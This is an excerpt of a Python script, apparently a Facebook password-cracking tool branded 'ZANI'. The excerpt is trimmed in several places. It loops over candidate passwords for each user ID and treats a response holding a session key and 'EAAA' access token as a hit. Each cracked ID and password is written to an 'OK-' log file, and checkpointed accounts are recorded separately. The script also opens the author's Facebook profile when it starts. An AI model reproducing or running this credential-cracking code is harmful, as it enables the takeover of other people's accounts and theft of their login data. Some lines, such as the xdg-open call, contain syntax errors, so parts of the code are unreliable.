...
class Main:
	def __init__(self):
		...
		os.system("clear")
		jalan(" ••• FOLLOW MY FACEBOOK ACCOUNT  :) thank you")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000138827119')")
		time.sleep(4)
		os.system("clear")
		os.system("figlet ZANI")
		print("\n  ( Programmed By AZAN ALI )") 
		print("\n  ( Facebook : AZAN X. )") 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [ZANII-SUCCESSFUL]:-%s - [ZANI-CHECKPOINT]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ZANI-CHECKPOINT] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[ZANI-CHECKPOINT] %s • %s\033[0;97m         "%(uid, pw))
